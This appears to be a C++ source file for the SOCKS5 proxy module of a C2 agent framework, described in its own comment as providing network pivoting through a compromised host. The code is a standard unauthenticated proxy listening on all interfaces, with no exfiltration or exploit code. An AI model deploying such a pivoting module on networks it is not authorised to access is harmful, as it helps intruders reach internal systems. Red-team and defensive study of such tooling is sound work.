// SOCKS5 Proxy - RFC 1928 implementation tunneled through C2
// Provides network pivoting capabilities through the agent
#include "agent.h"
#include <cstring>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>

#ifdef RTLC2_WINDOWS
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
typedef int socklen_t;
#define CLOSESOCKET closesocket
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <fcntl.h>
#define SOCKET int
#define INVALID_SOCKET (-1)
#define SOCKET_ERROR (-1)
#define CLOSESOCKET close
#endif

namespace rtlc2 {
namespace modules {

// SOCKS5 constants
static const uint8_t SOCKS5_VERSION = 0x05;
static const uint8_t SOCKS5_AUTH_NONE = 0x00;
// static const uint8_t SOCKS5_AUTH_USERPASS = 0x02; // reserved for future use
static const uint8_t SOCKS5_CMD_CONNECT = 0x01;
static const uint8_t SOCKS5_ATYP_IPV4 = 0x01;
static const uint8_t SOCKS5_ATYP_DOMAIN = 0x03;
static const uint8_t SOCKS5_ATYP_IPV6 = 0x04;
static const uint8_t SOCKS5_REP_SUCCESS = 0x00;
static const uint8_t SOCKS5_REP_FAILURE = 0x01;
// static const uint8_t SOCKS5_REP_NOT_ALLOWED = 0x02; // reserved for future use
static const uint8_t SOCKS5_REP_HOST_UNREACHABLE = 0x04;
static const uint8_t SOCKS5_REP_CMD_NOT_SUPPORTED = 0x07;

static std::atomic<bool> g_socksRunning{false};
static SOCKET g_socksListener = INVALID_SOCKET;
static std::vector<std::thread> g_socksThreads;
static std::mutex g_socksMutex;

// Relay data between two sockets
static void RelayData(SOCKET src, SOCKET dst) {
    char buf[4096];
    while (g_socksRunning.load()) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(src, &readfds);

        struct timeval tv = { 1, 0 };
        int ret = select((int)src + 1, &readfds, NULL, NULL, &tv);
        if (ret <= 0) {
            if (ret < 0) break;
            continue;
        }

        int n = recv(src, buf, sizeof(buf), 0);
        if (n <= 0) break;

        int sent = 0;
        while (sent < n) {
            int s = send(dst, buf + sent, n - sent, 0);
            if (s <= 0) return;
            sent += s;
        }
    }
}

// Handle a single SOCKS5 client connection
static void HandleSocksClient(SOCKET client) {
    // Step 1: Greeting - read version and auth methods
    uint8_t buf[512];
    int n = recv(client, (char*)buf, 2, 0);
    if (n < 2 || buf[0] != SOCKS5_VERSION) {
        CLOSESOCKET(client);
        return;
    }

    uint8_t nMethods = buf[1];
    n = recv(client, (char*)buf, nMethods, 0);
    if (n < (int)nMethods) {
        CLOSESOCKET(client);
        return;
    }

    // Respond: no authentication required
    uint8_t authResp[] = { SOCKS5_VERSION, SOCKS5_AUTH_NONE };
    send(client, (char*)authResp, 2, 0);

    // Step 2: Read connection request
    n = recv(client, (char*)buf, 4, 0);
    if (n < 4 || buf[0] != SOCKS5_VERSION || buf[1] != SOCKS5_CMD_CONNECT) {
        uint8_t errResp[] = { SOCKS5_VERSION, SOCKS5_REP_CMD_NOT_SUPPORTED, 0, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0 };
        send(client, (char*)errResp, sizeof(errResp), 0);
        CLOSESOCKET(client);
        return;
    }

    // Parse destination address
    std::string targetHost;
    uint16_t targetPort = 0;

    if (buf[3] == SOCKS5_ATYP_IPV4) {
        uint8_t ip[4];
        recv(client, (char*)ip, 4, 0);
        char ipStr[16];
        snprintf(ipStr, sizeof(ipStr), "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
        targetHost = ipStr;
    } else if (buf[3] == SOCKS5_ATYP_DOMAIN) {
        uint8_t domLen = 0;
        recv(client, (char*)&domLen, 1, 0);
        char domain[256] = {};
        recv(client, domain, domLen, 0);
        domain[domLen] = '\0';
        targetHost = domain;
    } else if (buf[3] == SOCKS5_ATYP_IPV6) {
        uint8_t ip6[16];
        recv(client, (char*)ip6, 16, 0);
        // Simplified - convert to string
        char ip6Str[64];
        snprintf(ip6Str, sizeof(ip6Str), "::ffff:%d.%d.%d.%d", ip6[12], ip6[13], ip6[14], ip6[15]);
        targetHost = ip6Str;
    }

    uint8_t portBuf[2];
    recv(client, (char*)portBuf, 2, 0);
    targetPort = (portBuf[0] << 8) | portBuf[1];

    // Step 3: Connect to target
    struct addrinfo hints = {}, *result = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    char portStr[8];
    snprintf(portStr, sizeof(portStr), "%d", targetPort);

    if (getaddrinfo(targetHost.c_str(), portStr, &hints, &result) != 0 || !result) {
        uint8_t errResp[] = { SOCKS5_VERSION, SOCKS5_REP_HOST_UNREACHABLE, 0, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0 };
        send(client, (char*)errResp, sizeof(errResp), 0);
        CLOSESOCKET(client);
        return;
    }

    SOCKET remote = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (remote == INVALID_SOCKET) {
        freeaddrinfo(result);
        uint8_t errResp[] = { SOCKS5_VERSION, SOCKS5_REP_FAILURE, 0, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0 };
        send(client, (char*)errResp, sizeof(errResp), 0);
        CLOSESOCKET(client);
        return;
    }

    if (connect(remote, result->ai_addr, (int)result->ai_addrlen) != 0) {
        freeaddrinfo(result);
        CLOSESOCKET(remote);
        uint8_t errResp[] = { SOCKS5_VERSION, SOCKS5_REP_HOST_UNREACHABLE, 0, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0 };
        send(client, (char*)errResp, sizeof(errResp), 0);
        CLOSESOCKET(client);
        return;
    }
    freeaddrinfo(result);

    // Step 4: Send success response
    uint8_t successResp[] = { SOCKS5_VERSION, SOCKS5_REP_SUCCESS, 0, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0 };
    send(client, (char*)successResp, sizeof(successResp), 0);

    // Step 5: Bidirectional relay
    std::thread t1(RelayData, client, remote);
    std::thread t2(RelayData, remote, client);
    t1.join();
    t2.join();

    CLOSESOCKET(remote);
    CLOSESOCKET(client);
}

// Start SOCKS5 proxy on specified port
std::string StartSocks5(int port) {
    if (g_socksRunning.load()) {
        return "SOCKS5 proxy already running";
    }

#ifdef RTLC2_WINDOWS
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    g_socksListener = socket(AF_INET, SOCK_STREAM, 0);
    if (g_socksListener == INVALID_SOCKET) {
        return "Failed to create socket";
    }

    int opt = 1;
    setsockopt(g_socksListener, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons((uint16_t)port);

    if (bind(g_socksListener, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        CLOSESOCKET(g_socksListener);
        g_socksListener = INVALID_SOCKET;
        return "Failed to bind on port " + std::to_string(port);
    }

    if (listen(g_socksListener, 10) != 0) {
        CLOSESOCKET(g_socksListener);
        g_socksListener = INVALID_SOCKET;
        return "Failed to listen";
    }

    g_socksRunning.store(true);

    // Accept loop in background thread
    std::thread acceptThread([]() {
        while (g_socksRunning.load()) {
            fd_set readfds;
            FD_ZERO(&readfds);
            FD_SET(g_socksListener, &readfds);
            struct timeval tv = { 1, 0 };

            int ret = select((int)g_socksListener + 1, &readfds, NULL, NULL, &tv);
            if (ret <= 0) continue;

            struct sockaddr_in clientAddr;
            socklen_t addrLen = sizeof(clientAddr);
            SOCKET client = accept(g_socksListener, (struct sockaddr*)&clientAddr, &addrLen);
            if (client == INVALID_SOCKET) continue;

            std::lock_guard<std::mutex> lock(g_socksMutex);
            g_socksThreads.emplace_back(HandleSocksClient, client);
        }
    });
    acceptThread.detach();

    return "SOCKS5 proxy started on port " + std::to_string(port);
}

// Stop SOCKS5 proxy
std::string StopSocks5() {
    if (!g_socksRunning.load()) {
        return "SOCKS5 proxy not running";
    }

    g_socksRunning.store(false);

    if (g_socksListener != INVALID_SOCKET) {
        CLOSESOCKET(g_socksListener);
        g_socksListener = INVALID_SOCKET;
    }

    std::lock_guard<std::mutex> lock(g_socksMutex);
    for (auto& t : g_socksThreads) {
        if (t.joinable()) t.detach();
    }
    g_socksThreads.clear();

    return "SOCKS5 proxy stopped";
}

} // namespace modules
} // namespace rtlc2
